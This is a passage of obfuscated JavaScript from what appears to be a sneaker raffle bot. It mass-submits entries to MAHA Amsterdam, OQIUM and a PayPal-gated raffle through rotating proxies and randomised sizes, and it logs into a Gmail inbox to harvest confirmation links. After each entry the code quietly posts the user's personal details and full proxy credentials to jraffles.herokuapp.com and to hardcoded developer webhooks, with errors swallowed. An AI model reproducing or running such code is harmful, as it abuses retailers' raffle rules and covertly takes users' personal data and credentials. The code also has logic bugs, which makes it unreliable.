                            await _0x32344d(0x12c), console['log'](_0xb0c82c() + '\x20[' + _0x515e1c['name'] + ']\x20Task\x20' + (_0x4043bd + 0x1) + '\x20:\x20Filling\x20Information'), await _0x27075f['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x32344d(0x12c), await _0x27075f['type']('#dwfrm_raffle_addressFields_firstName', _0x557a9c[_0x4043bd]['FirstName']), await _0x32344d(0x12c), await _0x27075f['type']('#dwfrm_raffle_addressFields_lastName', _0x557a9c[_0x4043bd]['LastName']), await _0x32344d(0x12c), await _0x27075f['select']('#dwfrm_raffle_addressFields_country', _0x557a9c[_0x4043bd]['Country']), await _0x32344d(0x12c), await _0x27075f['type']('#dwfrm_raffle_addressFields_city', _0x557a9c[_0x4043bd]['City']), await _0x32344d(0x12c);
                            _0x557a9c[_0x4043bd]['Postcode'] == undefined && (_0x557a9c[_0x4043bd]['Postcode'] = _0x557a9c[_0x4043bd]['Zip']);
                            await _0x27075f['type']('#dwfrm_raffle_addressFields_postalCode', _0x557a9c[_0x4043bd]['Postcode']), await _0x32344d(0x12c), await _0x27075f['type']('#dwfrm_raffle_addressFields_address1', _0x557a9c[_0x4043bd]['Address1']), await _0x32344d(0x12c), await _0x27075f['type']('#dwfrm_raffle_addressFields_address2', _0x557a9c[_0x4043bd]['HouseNumber']), await _0x32344d(0x12c), await _0x27075f['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x557a9c[_0x4043bd]['Address2']), await _0x32344d(0x12c), await _0x27075f['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x32344d(0x12c), await _0x27075f['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x557a9c[_0x4043bd]['Follower']), await _0x32344d(0x1f4), await _0x27075f['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x32344d(0x1f4), console['log'](_0xb0c82c() + '\x20[' + _0x515e1c['name'] + ']\x20Task\x20' + (_0x4043bd + 0x1) + '\x20:\x20' + _0x5b4136['blue']('Awaiting\x20Paypal\x20Payment')), await _0x27075f['click']('.b-paypal_button');
                            try {
                                await _0x27075f['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x2b02b7 = 'no', _0x5677a4(_0x557a9c[_0x4043bd], _0x515e1c), console['log'](_0x5b4136['green'](_0xb0c82c() + '\x20[' + _0x515e1c['name'] + ']\x20Task\x20' + (_0x4043bd + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x4010be['succesDEVMSG']);
                                await _0x32344d(0xc8), await _0x16e110(_0x275f2a, _0x4010be['succesDEVMSG']), await _0x32344d(0xc8), await _0x16e110(_0x583375, _0x4010be['succesPUBMSG']);
                                let _0x4f8f1c = _0x557a9c[_0x4043bd];
                                try {
                                    prxdata = {
                                        'username': _0x4b3861['replace']('#', ''),
                                        'module': _0x515e1c['name'],
                                        'entrydata': JSON['stringify'](_0x4f8f1c),
                                        'proxy': '' + _0x343a38[_0x4043bd]
                                    };
                                    var _0x18d3e5 = JSON['stringify'](prxdata);
                                    let _0x207257 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3c1aeb['post']('https://jraffles.herokuapp.com/success', _0x18d3e5, _0x207257);
                                } catch (_0x7a037b) {
                                }
                            } catch (_0x1a6a4d) {
                                console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x515e1c['name'] + ']\x20Task\x20' + (_0x4043bd + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x1a6a4d)), _0x15a5d7 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x1a6a4d;
                                var _0x443942 = await _0xe56989(_0x557a9c[_0x4043bd], _0x515e1c, 'dev', !![], _0x15a5d7);
                                _0x4010be['errorDEV'] = { 'embeds': [_0x443942] }, _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x4010be['errorDEV']), await _0x16e110(_0x3ba800, _0x4010be['errorDEV']);
                            }
                        } catch (_0x5061fb) {
                            console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x515e1c['name'] + ']\x20Task\x20' + (_0x4043bd + 0x1) + '\x20:\x20' + _0x5061fb)), _0x15a5d7 = '' + _0x5061fb;
                            var _0x443942 = await _0xe56989(_0x557a9c[_0x4043bd], _0x515e1c, 'dev', !![], _0x15a5d7);
                            _0x4010be['errorDEV'] = { 'embeds': [_0x443942] }, _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x4010be['errorDEV']), await _0x16e110(_0x3ba800, _0x4010be['errorDEV']), _0x2b02b7 = 'yes';
                        } finally {
                            _0x557510 && _0x557510['close']();
                            if (_0x2b02b7 == 'yes' && _0xef990a != 0x5) {
                                console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x515e1c['name'] + ']\x20Task\x20' + (_0x4043bd + 0x1) + '\x20:\x20Retrying\x20(' + _0xef990a + '\x20/\x205)')), _0x4043bd = _0x4043bd - 0x1, _0xef990a = _0xef990a + 0x1;
                                continue;
                            }
                            _0x2b02b7 == 'yes' && _0xef990a >= 0x5 && (_0x4af7c0(_0x557a9c[_0x4043bd], _0x515e1c), _0x2b02b7 = 'no', _0xef990a = 0x0), console['log']('Waiting\x20for\x20' + _0x8aa917['AfewDelay'] + '\x20ms'), await _0x32344d(_0x8aa917['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RLhP3P',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'TRdHMm',
                                '$consent_form_version': 0x899638,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x515381, _0x2829c7, _0x1a9b4e) {
                    for (var _0x38cebc = 0x0; _0x38cebc < _0x2829c7['length']; _0x38cebc++) {
                        try {
                            await _0x4669df(_0x2829c7, _0x38cebc);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x234923(_0x113235, _0x46964a, _0x4c4fc9, _0x3fad8a, _0x497877) {
                            var _0x57dd50, _0x439faf = {}, _0x41515d = [], _0x10ccbb = {}, _0x2b5c4d = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x707b68 = Math['round'](Math['random']() * (_0x2b5c4d['length'] - 0x1));
                            !_0x3fad8a && (_0x3fad8a = {});
                            if (_0x46964a != 'ver') {
                                _0x299f70(_0x4c4fc9['name'] + '\x20Task\x20' + (_0x113235 + 0x1) + '\x20/\x20' + _0x3fad8a['length'] + '\x20||\x20File:\x20' + _0x1901f8 + '\x20Proxies:\x20' + _0x504c2d), await _0x4669df(_0x3fad8a, _0x113235), _0x439faf = _0x4c4fc9['data'], _0x439faf['data']['attributes']['email'] = '' + _0x3fad8a[_0x113235]['Email'];
                                if (_0x3fad8a[_0x113235]['Size'] == 'RANDOM') {
                                }
                                _0x439faf['data']['attributes']['properties']['$first_name'] = '' + _0x3fad8a[_0x113235]['FirstName'], _0x439faf['data']['attributes']['properties']['$last_name'] = '' + _0x3fad8a[_0x113235]['LastName'], _0x439faf['data']['attributes']['properties']['$address1'] = _0x3fad8a[_0x113235]['Address1'] + '\x20' + _0x3fad8a[_0x113235]['Address2'] + '\x20' + _0x3fad8a[_0x113235]['HouseNumber'], _0x439faf['data']['attributes']['properties']['$zip'] = '' + _0x3fad8a[_0x113235]['Zip'], _0x439faf['data']['attributes']['properties']['$city'] = '' + _0x3fad8a[_0x113235]['City'], _0x439faf['data']['attributes']['properties']['$country'] = '' + _0x3fad8a[_0x113235]['Country'], _0x3fad8a[_0x113235]['Size'] == 'RANDOM' ? _0x439faf['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x2b5c4d[_0x707b68] : _0x439faf['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x3fad8a[_0x113235]['Size'], _0x439faf['data']['attributes']['properties']['$phone_number'] = '' + _0x3fad8a[_0x113235]['Phone'], _0x439faf['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x3fad8a[_0x113235]['Follower'];
                            }
                            if (_0x8aa917['useRandomProxy'] = ![])
                                var _0x4f1dd8 = _0x497877[_0x113235]['split'](':');
                            else
                                var _0x2dbd5b = Math['round'](Math['random']() * (_0x497877['length'] - 0x1)), _0x4f1dd8 = _0x497877[_0x2dbd5b]['split'](':');
                            var _0x3a338c = {
                                'jar': _0x1d89eb,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x4c4fc9['url'],
                                'headers': _0x4c4fc9['headers'],
                                'body': JSON['stringify'](_0x439faf),
                                'proxy': 'http://' + _0x4f1dd8[0x2] + ':' + _0x4f1dd8[0x3] + '@' + _0x4f1dd8[0x0] + ':' + _0x4f1dd8[0x1]
                            };
                            return _0x46964a != 'ver' && (_0x3a338c['url'] = _0x4c4fc9['url'], _0x3a338c['headers'] = _0x4c4fc9['headers']), _0x46964a == 'ver' && (_0x3a338c['method'] = 'GET'), new Promise(function (_0x165e4d, _0x851df7) {
                                callback = async (_0x59e4d6, _0x19c8ea, _0x22d478) => {
                                    if (!_0x59e4d6 && _0x19c8ea['statusCode'] == 0xca || !_0x59e4d6 && _0x19c8ea['statusCode'] == 0xc8) {
                                        if (_0x46964a != 'ver') {
                                            var _0x248810 = await _0xe56989(_0x3fad8a[_0x113235], _0x4c4fc9, 'dev', ![]), _0x43b992 = await _0xe56989(_0x3fad8a[_0x113235], _0x4c4fc9, 'pub', ![]);
                                            const _0x19c998 = {
                                                'succesDEVMSG': { 'embeds': [_0x248810] },
                                                'succesPUBMSG': { 'embeds': [_0x43b992] }
                                            };
                                            let _0x3d906a = _0x3fad8a[_0x113235];
                                            try {
                                                prxdata = {
                                                    'username': _0x4b3861['replace']('#', ''),
                                                    'module': _0x4c4fc9['name'],
                                                    'entrydata': JSON['stringify'](_0x3d906a),
                                                    'proxy': '' + _0x497877[_0x113235]
                                                };
                                                var _0x4c06e4 = JSON['stringify'](prxdata);
                                                let _0x523ef4 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x3c1aeb['post']('https://jraffles.herokuapp.com/success', _0x4c06e4, _0x523ef4);
                                            } catch (_0x3e085d) {
                                            }
                                            if (_0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '')
                                                try {
                                                    await _0x16e110(_0x8aa917['webhook'], _0x19c998['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x32344d(0xc8), await _0x16e110(_0x275f2a, _0x19c998['succesDEVMSG']), await _0x32344d(0xc8);
                                            try {
                                                await _0x16e110(_0x583375, _0x19c998['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x5677a4(_0x3fad8a[_0x113235], _0x4c4fc9);
                                        }
                                        _0x165e4d(console['log'](_0x5b4136['green'](_0xb0c82c() + '\x20[' + _0x4c4fc9['name'] + ']\x20Task\x20' + (_0x113235 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x46964a != 'ver') {
                                            var _0x384219 = '' + _0x59e4d6, _0x414380 = await _0xe56989(_0x3fad8a[_0x113235], _0x4c4fc9, 'dev', !![], _0x384219), _0x2a51af = {};
                                            _0x2a51af['errorDEV'] = { 'embeds': [_0x414380] }, _0x4af7c0(_0x3fad8a[_0x113235], _0x4c4fc9), _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x2a51af['errorDEV']), await _0x16e110(_0x3ba800, _0x2a51af['errorDEV']);
                                        }
                                        _0x851df7(console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x4c4fc9['name'] + ']\x20Task\x20' + (_0x113235 + 0x1) + ':\x20' + _0x59e4d6)));
                                    }
                                };
                                try {
                                    _0x46964a != 'ver' && console['log'](_0xb0c82c() + '\x20[' + _0x4c4fc9['name'] + ']\x20Task\x20' + (_0x113235 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x439faf['data']['attributes']['email']), _0x5e7c58(_0x3a338c, callback);
                                } catch (_0x26e65e) {
                                    console['log'](_0xb0c82c() + '\x20Task\x20' + (_0x113235 + 0x1) + ':\x20' + _0x26e65e);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x234923(_0x38cebc, 'nor', _0x515381, _0x2829c7, _0x1a9b4e), console['log'](_0xb0c82c() + '\x20[' + _0x515381['name'] + ']\x20Sleeping\x20for\x20' + _0x8aa917['delay'] + '\x20ms'), await _0x32344d(_0x8aa917['delay']);
                        } catch (_0x105ecd) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x79aad, _0x5e7468, _0x4b3773) {
                    var _0x41faf9 = [], _0xdd2821 = ![];
                    async function _0x42f4d1() {
                        var _0x5eb20d = new _0x16dd9e({
                            'user': _0x8aa917['masterMail'],
                            'password': _0x8aa917['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x3b59e1(_0x4d671a) {
                            _0x5eb20d['openBox']('INBOX', ![], _0x4d671a);
                        }
                        _0x5eb20d['once']('ready', function () {
                            _0x3b59e1(function (_0x35fbe5, _0x434c03) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x35fbe5)
                                    throw _0x35fbe5;
                                _0x5eb20d['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x49253c, _0x1bbe21) {
                                    if (!_0x1bbe21 || !_0x1bbe21['length'])
                                        console['log'](_0xb0c82c() + '\x20[' + _0x79aad['name'] + ']\x20No\x20mails\x20found'), _0x5eb20d['end']();
                                    else {
                                        var _0x453d95 = _0x5eb20d['seq']['fetch'](_0x1bbe21, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x453d95['on']('message', function (_0x174e0f, _0x52ba4a) {
                                            var _0xe056b5 = '(#' + _0x52ba4a + ')\x20';
                                            _0x174e0f['on']('body', function (_0x1e9fec, _0x457c9d) {
                                                _0x4b0324(_0x1e9fec, (_0x1ed0f0, _0x4ef826) => {
                                                    var _0x2001f2 = _0x4ef826['text']['split']('(')[0x1], _0x258ee8 = _0x2001f2['split'](')')[0x0];
                                                    _0x41faf9['push'](_0x258ee8);
                                                });
                                            }), _0x174e0f['once']('end', function () {
                                            });
                                        }), _0x453d95['once']('error', function (_0x9c7e65) {
                                            console['log']('Fetch\x20error:\x20' + _0x9c7e65), _0xdd2821 = !![];
                                        }), _0x453d95['once']('end', function () {
                                            _0x5eb20d['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x5eb20d['once']('error', function (_0x47955e) {
                            console['log'](_0x5b4136['red'](_0x47955e['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0xdd2821 = !![];
                        }), _0x5eb20d['once']('end', async function () {
                            _0xdd2821 = !![];
                        }), _0x5eb20d['connect']();
                    }
                    async function _0x17f170(_0x548172, _0x1af365, _0x2fe987) {
                        for (var _0x438ac7 = 0x0; _0x438ac7 < _0x1af365['length']; _0x438ac7++) {
                            async function _0x4e14d2(_0x35ca31, _0x15b656, _0x2488b2, _0x1a8ac6, _0x2c7f82) {
                                var _0x3523b6, _0xa5c26b = {}, _0xfafa3b = [], _0x12f5fb = {}, _0x38aa78 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x55a18d = Math['round'](Math['random']() * (_0x38aa78['length'] - 0x1));
                                _0x1a8ac6[_0x35ca31]['Size'] == 'RANDOM' && (_0x1a8ac6[_0x35ca31]['Size'] = _0x38aa78[_0x55a18d]);
                                !_0x1a8ac6 && (_0x1a8ac6 = {});
                                if (_0x8aa917['useRandomProxy'] = ![])
                                    var _0x2aba35 = _0x2c7f82[_0x35ca31]['split'](':');
                                else
                                    var _0x24cbae = Math['round'](Math['random']() * (_0x2c7f82['length'] - 0x1)), _0x2aba35 = _0x2c7f82[_0x24cbae]['split'](':');
                                var _0x2eca3c = {
                                    'jar': _0x1d89eb,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x2488b2['url'],
                                    'headers': _0x2488b2['headers'],
                                    'body': JSON['stringify'](_0xa5c26b),
                                    'proxy': 'http://' + _0x2aba35[0x2] + ':' + _0x2aba35[0x3] + '@' + _0x2aba35[0x0] + ':' + _0x2aba35[0x1]
                                };
                                return _0x15b656 != 'ver' && (_0x2eca3c['url'] = _0x2488b2['url'], _0x2eca3c['headers'] = _0x2488b2['headers']), _0x15b656 == 'ver' && (_0x2eca3c['method'] = 'GET', _0x2eca3c['url'] = _0x1a8ac6[_0x35ca31]), new Promise(function (_0x5d39a2, _0x456a7) {
                                    callback = async (_0x5364c7, _0x17298d, _0x420a88) => {
                                        if (!_0x5364c7 && _0x17298d['statusCode'] == 0xca || !_0x5364c7 && _0x17298d['statusCode'] == 0xc8) {
                                            if (_0x15b656 != 'ver') {
                                                var _0xced6cb = await _0xe56989(_0x1a8ac6[_0x35ca31], _0x2488b2, 'dev', ![]), _0x32a7e4 = await _0xe56989(_0x1a8ac6[_0x35ca31], _0x2488b2, 'pub', ![]);
                                                const _0x44198f = {
                                                    'succesDEVMSG': { 'embeds': [_0xced6cb] },
                                                    'succesPUBMSG': { 'embeds': [_0x32a7e4] }
                                                };
                                                if (_0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '')
                                                    try {
                                                        await _0x16e110(_0x8aa917['webhook'], _0x44198f['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x32344d(0xc8), await _0x16e110(_0x275f2a, _0x44198f['succesDEVMSG']), await _0x32344d(0xc8);
                                                try {
                                                    await _0x16e110(_0x583375, _0x44198f['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x5677a4(_0x1a8ac6[_0x35ca31], _0x2488b2);
                                            }
                                            _0x5d39a2(console['log'](_0x5b4136['green'](_0xb0c82c() + '\x20[' + _0x2488b2['name'] + ']\x20Task\x20' + (_0x35ca31 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x15b656 != 'ver') {
                                                var _0x87b07a = '' + _0x5364c7, _0x3017dd = await _0xe56989(_0x1a8ac6[_0x35ca31], _0x2488b2, 'dev', !![], _0x87b07a), _0x936dc1 = {};
                                                _0x936dc1['errorDEV'] = { 'embeds': [_0x3017dd] }, _0x4af7c0(_0x1a8ac6[_0x35ca31], _0x2488b2), _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x936dc1['errorDEV']), await _0x16e110(_0x3ba800, _0x936dc1['errorDEV']);
                                            }
                                            _0x456a7(console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x2488b2['name'] + ']\x20Task\x20' + (_0x35ca31 + 0x1) + ':\x20' + _0x5364c7)));
                                        }
                                    };
                                    try {
                                        _0x15b656 != 'ver' ? console['log'](_0xb0c82c() + '\x20[' + _0x2488b2['name'] + ']\x20Task\x20' + (_0x35ca31 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0xa5c26b['data']['attributes']['email']) : console['log'](_0xb0c82c() + '\x20[' + _0x2488b2['name'] + ']\x20Task\x20' + (_0x35ca31 + 0x1) + ':\x20Fetching\x20Response'), _0x5e7c58(_0x2eca3c, callback);
                                    } catch (_0x3f059e) {
                                        console['log'](_0xb0c82c() + '\x20Task\x20' + (_0x35ca31 + 0x1) + ':\x20' + _0x3f059e);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x4e14d2(_0x438ac7, 'ver', _0x548172, _0x1af365, _0x2fe987), console['log'](_0xb0c82c() + '\x20[' + _0x548172['name'] + ']\x20Sleeping\x20for\x20' + _0x8aa917['delay'] + '\x20ms'), await _0x32344d(_0x8aa917['delay']);
                            } catch (_0x30e8c8) {
                            }
                        }
                    }
                    try {
                        _0x42f4d1();
                        while (!_0xdd2821) {
                            await _0x32344d(0xbb8);
                        }
                        console['log']('Found\x20' + _0x41faf9['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x32344d(0x9c4);
                    }
                    await _0x17f170(_0x79aad, _0x41faf9, _0x4b3773);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'X4md8Z',
                            'custom_source': 'DZ4137-106',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WspqGE',
                                '$consent_form_version': 0x89a2a4,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x303afc, _0x56c4ec, _0x3c2931) {
                    for (var _0x174fff = 0x0; _0x174fff < _0x56c4ec['length']; _0x174fff++) {
                        try {
                            await _0x4669df(_0x56c4ec, _0x174fff);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x5ca122(_0x3d939e, _0x59d39c, _0x35bb1f, _0x441574, _0x1da058) {
                            var _0x5c9cf1, _0x1e9601 = {}, _0x4df790 = [], _0x380189 = {}, _0x54dd30 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x1741c2 = Math['round'](Math['random']() * (_0x54dd30['length'] - 0x1));
                            !_0x441574 && (_0x441574 = {});
                            if (_0x59d39c != 'ver') {
                                _0x299f70(_0x35bb1f['name'] + '\x20Task\x20' + (_0x3d939e + 0x1) + '\x20/\x20' + _0x441574['length'] + '\x20||\x20File:\x20' + _0x1901f8 + '\x20Proxies:\x20' + _0x504c2d), _0x4df790 = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x4b3861
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0x441574[_0x3d939e]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x8aa917['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0xe2f4c8
                                        }
                                    ]
                                }], _0x380189 = { 'embeds': _0x4df790 }, _0x1e9601 = _0x35bb1f['data'], _0x1e9601['data']['attributes']['email'] = '' + _0x441574[_0x3d939e]['Email'];
                                if (_0x441574[_0x3d939e]['Size'] == 'RANDOM') {
                                }
                                _0x1e9601['data']['attributes']['properties']['$first_name'] = '' + _0x441574[_0x3d939e]['FirstName'], _0x1e9601['data']['attributes']['properties']['$last_name'] = '' + _0x441574[_0x3d939e]['LastName'], _0x1e9601['data']['attributes']['properties']['$address1'] = _0x441574[_0x3d939e]['Address1'] + '\x20' + _0x441574[_0x3d939e]['Address2'] + '\x20' + _0x441574[_0x3d939e]['HouseNumber'], _0x1e9601['data']['attributes']['properties']['$zip'] = '' + _0x441574[_0x3d939e]['Zip'], _0x1e9601['data']['attributes']['properties']['$city'] = '' + _0x441574[_0x3d939e]['City'], _0x1e9601['data']['attributes']['properties']['$country'] = '' + _0x441574[_0x3d939e]['Country'], _0x441574[_0x3d939e]['Size'] == 'RANDOM' ? _0x1e9601['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x54dd30[_0x1741c2] : _0x1e9601['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x441574[_0x3d939e]['Size'], _0x1e9601['data']['attributes']['properties']['$phone_number'] = '' + _0x441574[_0x3d939e]['Phone'], _0x1e9601['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x441574[_0x3d939e]['Follower'];
                            }
                            if (_0x8aa917['useRandomProxy'] = ![])
                                var _0x2e9b84 = _0x1da058[_0x3d939e]['split'](':');
                            else
                                var _0x59542f = Math['round'](Math['random']() * (_0x1da058['length'] - 0x1)), _0x2e9b84 = _0x1da058[_0x59542f]['split'](':');
                            var _0x1d9ef2 = {
                                'jar': _0x1d89eb,
                                'followAllRedirects': !![],
                                'method': 'POST',
